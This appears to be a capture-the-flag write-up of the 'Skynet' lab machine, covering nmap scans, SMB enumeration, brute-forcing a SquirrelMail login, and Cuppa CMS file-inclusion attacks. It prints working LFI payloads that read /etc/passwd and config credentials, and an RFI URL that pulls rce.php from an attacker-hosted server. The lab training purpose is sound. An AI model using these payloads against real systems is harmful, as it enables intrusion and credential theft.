# Skynet

### Deploy and compromise the vulnerable machine!
Initial scan: 

      nmap 10.10.210.244 -n -Pn -p- --min-rate=1000 
      Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-22 13:58 CEST
      Nmap scan report for 10.10.210.244
      Host is up (0.046s latency).
      Not shown: 65529 closed tcp ports (conn-refused)
      PORT    STATE SERVICE
      22/tcp  open  ssh
      80/tcp  open  http
      110/tcp open  pop3
      139/tcp open  netbios-ssn
      143/tcp open  imap
      445/tcp open  microsoft-ds
      
      Nmap done: 1 IP address (1 host up) scanned in 66.63 seconds

Let's now run a more targeted scan: 

    nmap 10.10.210.244 -p22,80,110,139,143,445 -sV -sC -oN scan
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-22 14:28 CEST
    Nmap scan report for 10.10.210.244
    Host is up (0.047s latency).
    
    PORT    STATE SERVICE     VERSION
    22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
    |   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
    |_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
    80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Skynet
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    110/tcp open  pop3        Dovecot pop3d
    |_pop3-capabilities: UIDL SASL CAPA AUTH-RESP-CODE PIPELINING RESP-CODES TOP
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    143/tcp open  imap        Dovecot imapd
    |_imap-capabilities: more listed OK have LITERAL+ ENABLE LOGINDISABLEDA0001 IDLE SASL-IR Pre-login capabilities IMAP4rev1 LOGIN-REFERRALS ID post-login
    445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Host script results:
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: skynet
    |   NetBIOS computer name: SKYNET\x00
    |   Domain name: \x00
    |   FQDN: skynet
    |_  System time: 2024-09-22T07:29:18-05:00
    |_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2024-09-22T12:29:18
    |_  start_date: N/A
    |_clock-skew: mean: 1h40m02s, deviation: 2h53m12s, median: 2s
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 20.42 seconds


The web page shows a form to be compiled, but it doesn't seem to do anything really <br />
![image](https://github.com/user-attachments/assets/59d941f8-a546-4dfb-b28a-2cb96b503cf1)<br />
A directory enumeration reveals some interesting directories: <br />
![image](https://github.com/user-attachments/assets/3fdd81c1-533f-428c-a568-b4a0ba575516)<br />
But for each of them we get a 403 Forbidden, except the last one, squirrelmail, lol. <br />
![image](https://github.com/user-attachments/assets/2c648ddb-3d5b-4444-a632-79cd2cdba4bd)<br />
This version is vulnerable to RCE by an authenticated attacker ([source](https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html)): <br />
![image](https://github.com/user-attachments/assets/140dbc53-b486-4fee-ba8c-a38ffe37e645)<br />
I think the next step is to find a way to authenticate, we need to find some credentials. Let's try enumerating SMB shares. I used `enum4linux` for this task, and found something interesting: <br />
![image](https://github.com/user-attachments/assets/c067f4c0-3a22-4ef9-94f3-e3202e2221af)<br />
The target system has two local users: nobody and milesdyson. The output also shows the enumerated shares: <br />
![image](https://github.com/user-attachments/assets/9b3b21ed-a5b7-46b9-9360-64f85dfa4dc6)<br />
Let's try to access the anonymous share anonymously: `smbclient //10.10.190.140/anonymous -U anonymous -p 445`. I found an interesting file: <br />
![image](https://github.com/user-attachments/assets/962ab4d0-2a3c-4509-88e8-64764f95380b)<br />
Also if we access the logs folder, we are provided with 3 txt files: <br />
![image](https://github.com/user-attachments/assets/9e0de88a-536d-490d-91b4-7515b9b1357b)<br />
`log2.txt` and `log3.txt` are empty, but `log1.txt` contains a wordlista. At this point I think it's clear what we have to do: let's try to access Miles share using the given wordlist. I'll use hydra: `hydra -l milesdyson -P log1.txt smb://10.10.190.140 ` <br />
![image](https://github.com/user-attachments/assets/b6845aa7-7196-40ca-9ed3-025b9d50d922)<br />
Nope, this is not the right path. Next thing I wanna try is to bruteforce the squirrel mail login form using "milesdyson" as username, and the given wordlist as passwords. So first of all intercept the request using burpsuite, and set the password field as the target for intruder: <br />
![image](https://github.com/user-attachments/assets/3de3023a-f9e9-40a0-a5d2-ea27ed442b3e)<br />
Now go on "Payloads" and load our given wordlist as payload: <br />
![image](https://github.com/user-attachments/assets/c4fb84d3-25c9-45f8-9a3a-02d928954e82)<br />
Now start the attack. The very first thing I notiece is that the payload `cyborg007haloterminator` has different response parameters with respect to other payloads: <br />
![image](https://github.com/user-attachments/assets/62b45807-3564-4391-b06b-c8c15f8c147d)<br />
so I try to log in as `milesdyson:cyborg007haloterminator`, and it worked! <br />
![image](https://github.com/user-attachments/assets/dd896870-0b25-45bb-b8b9-04a8b9443494)<br />
There it is, in the first email there's the new SMB password for Miles: <br />
![image](https://github.com/user-attachments/assets/cd1e6d37-4126-46a6-8fd6-83471c3c20eb)<br />
Let's log in: `smbclient //10.10.190.140/milesdyson -U milesdyson -p 445`. There's a bunch of scientific pdf files, Miles must be some sort of AI teacher or something. After navigating a bit inside the share, i found a file named "important.txt" inside a directory called "notes": <br />
![image](https://github.com/user-attachments/assets/0e80c450-98f8-4f50-8f58-58d6ec257aa8)<br />
Let's download it and see what's in it. <br />
![image](https://github.com/user-attachments/assets/0ca23a05-0ed0-4624-b8ea-d255e58b69dc)<br />
Damn, Miles really cares about his wife. Anyway, let's access `http://target_IP/45kra24zxs28v3yd`: <br />
![image](https://github.com/user-attachments/assets/7e7a4d45-f47c-446f-aa17-f660336d81ee)<br />
Oh yes he is infact an AI specialist. The page itself seems empty, the source code doesn't contain any comments. Let's try some directory enumeration with `obuster dir -u http://10.10.190.140/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`. Yup, there's something there <br />
![image](https://github.com/user-attachments/assets/8cf719c1-1d90-4971-a17e-7f9ed064ede8)<br />
At this point I was stuck for a while, I didn't find anything, default credentials, sql Injection, etc. After a while I discovered that this version is vulnerable to File inclusion, even anauthenticated, [here](https://www.exploit-db.com/exploits/25971). <br />
![image](https://github.com/user-attachments/assets/52294868-bdee-44a7-86b2-ba222c2ea82d)<br />
So for example if we try to access `http://10.10.190.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`, it actually works and shows us the /etc/passwd file. <br />
![image](https://github.com/user-attachments/assets/3dd36bb6-f73b-45fa-8feb-e089289ce502)<br />
Let's try downloading the configuration file: `http://10.10.190.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php`. We get the following base64 encoded string in return. Decode it: 

      <?php 
      	class Configuration{
      		public $host = "localhost";
      		public $db = "cuppa";
      		public $user = "root";
      		public $password = "password123";
      		public $table_prefix = "cu_";
      		public $administrator_template = "default";
      		public $list_limit = 25;
      		public $token = "OBqIPqlFWf3X";
      		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
      		public $upload_default_path = "media/uploadsFiles";
      		public $maximum_file_size = "5242880";
      		public $secure_login = 0;
      		public $secure_login_value = "";
      		public $secure_login_redirect = "";
      	} 
And we got another set of credentials. These might be usefull later. Now let's try to include a malicious file from our own machine, let's call it rce.php (the code is provided in the file "rce.php" of this folder). Set up a web server with `python3 -m http.server 8000`, and upload it to the target machine with the following URL: `http://10.10.190.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.85.53:8000/rce.php`. There we go: <br />
![image](https://github.com/user-attachments/assets/f97120a9-1b82-4629-a34e-9a4818959216)<br />
The file was successfully uploaded.

                                                            
- What is Miles password for his emails?
- What is the hidden directory?
- What is the vulnerability called when you can include a remote file for malicious purposes?
- What is the user flag?
- What is the root flag?
